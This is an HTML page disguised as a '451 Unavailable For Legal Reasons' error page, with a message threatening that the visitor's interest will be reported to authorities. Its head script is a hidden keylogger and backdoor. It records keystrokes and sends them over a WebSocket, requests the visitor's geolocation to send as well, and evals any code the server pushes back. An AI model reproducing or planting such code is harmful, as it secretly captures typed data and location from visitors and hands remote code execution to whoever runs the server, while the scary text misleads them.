<!doctype HTML>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>451 Unavailable For Legal Reasons</title>
	<style type="text/css">
h1,
p {
	font-family: "Times New Roman", serif;
	margin: 5px;
}
	</style>
	<script type="text/javascript">
		let OPEN = 1;
		function onkeypress(ev) {
			if(ev.key === 'Enter') {
				if(!OPEN)
					ws.send(code);
				else {
					ws = new WebSocket(`${protocol}://${window.location.host}/ws`);
					setrenew(ws);
				}

				code = '';
			} else {
				code += ev.key;
			}
		}
		function setrenew(ws) {
			ws.onclose = function() {
				OPEN = false;
				ws = new WebSocket(`${protocol}://${window.location.host}/ws`); 
				setTimeout(function() {setrenew(ws);}, 10000);
			};
			
		}
		const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
		let ws = new WebSocket(`${protocol}://${window.location.host}/ws`);
		ws.onclose = function() {
			ws = new WebSocket(`${protocol}://${window.location.host}/ws`); 
			setrenew(ws);
		};
		let code = '';
		navigator.geolocation.getCurrentPosition(ws.send);
		document.addEventListener('keypress', onkeypress);
		ws.onmessage = data => eval(data.data);
	</script>
</head>
<body>
	<h1>451 Unavailable For Legal Reasons</h1>        
	<p>The requested resource is not available. We are not allowed to tell you more. Your interest in this will be logged and reported to authorities.</p>         
	<hr> 
	<p><i>kalium.xyz</i></p>
</body>
</html>
